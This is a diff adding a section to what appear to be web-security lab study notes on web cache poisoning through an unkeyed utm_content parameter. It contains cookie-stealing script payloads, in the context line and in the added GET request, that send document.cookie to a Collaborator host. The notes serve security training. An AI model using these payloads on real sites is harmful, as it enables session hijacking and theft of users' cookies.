@@ -414,6 +414,22 @@ document.location='https://collaboration.net/?cookies='+document.cookie;
   
 [Param Miner Extension to identify web cache vulnerabilities](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)  
   
+### utm_content  
+
+>Target is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. Param Miner's "Guess GET parameters" feature will ***identify*** the parameter as utm_content.  
+
+![Cache query reflected](images/cache-query-reflected.png)  
+  
+```
+GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+document.cookie</script>
+```  
+
+>Above payload is cached and the victim visiting target cookie send to Burp collaborator.  
+
+![cache-collaborator.png](images/cache-collaborator.png)  
+
+[PortSwigger Lab: Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)  
+  
 ## Host Header Poison - forgot-password
 
 ### Spoof IP Address  
